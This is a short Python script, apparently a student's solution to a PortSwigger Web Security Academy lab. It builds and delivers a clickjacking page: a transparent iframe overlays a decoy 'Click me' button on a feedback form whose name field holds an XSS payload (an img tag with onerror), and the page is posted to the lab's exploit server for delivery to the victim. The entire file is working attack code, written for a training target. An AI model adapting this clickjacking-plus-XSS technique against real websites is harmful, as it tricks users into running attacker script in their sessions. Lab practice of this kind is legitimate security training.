import requests
from bs4 import BeautifulSoup

site = '0aba00ed04bc4d7d8080f8de00d70004.web-security-academy.net'
s = requests.Session()
site_url = f'https://{site}/'
resp = s.get(site_url)
soup = BeautifulSoup(resp.text, 'html.parser')
exploit_url = soup.find('a', {'id': 'exploit-link'}).get('href')

iframe_url = f"https://{site}/feedback?name=%3Cimg%20src%3D1%20onerror%3Dprint()%3E&email=calizo@pdx.edu&subject=foo&message=bar"

exploit_html = f'''<style>
   iframe {{
       position: relative;
       width: 700px;
       height: 1000px;
       opacity: 0.3;
       z-index: 2;
   }}
   div {{
       position: absolute;
       top: 800px;
       left: 70px;
       z-index: 1;
   }}
</style>
<div>Click me</div>
<iframe src="{iframe_url}"></iframe>
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}

resp = s.post(exploit_url, data=formData)
print('[+] Exploit stored. Visit "View exploit" to check position.')